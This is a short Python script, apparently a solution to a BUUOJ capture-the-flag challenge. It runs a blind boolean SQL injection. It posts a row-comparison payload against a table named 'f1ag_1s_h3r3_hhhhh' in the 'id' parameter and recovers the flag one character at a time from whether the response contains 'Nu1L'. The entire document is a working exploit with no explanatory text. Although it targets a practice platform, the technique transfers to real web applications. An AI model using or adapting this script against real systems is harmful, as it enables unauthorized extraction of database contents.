import requests
url = 'http://44dc68e6-f7be-4969-9f4b-2aa7875e751b.node3.buuoj.cn/index.php'
x=''
for j in range(1,50):
    for i in range(33,127):
        flag=x+chr(i)
        payload = "1&&((1,'{}')>(select * from f1ag_1s_h3r3_hhhhh))".format(flag)
        data={
        'id':payload
        }
        r = requests.post(url,data=data)
        if 'Nu1L' in r.text:
            x=x+chr(i-1)
            print(x)
            break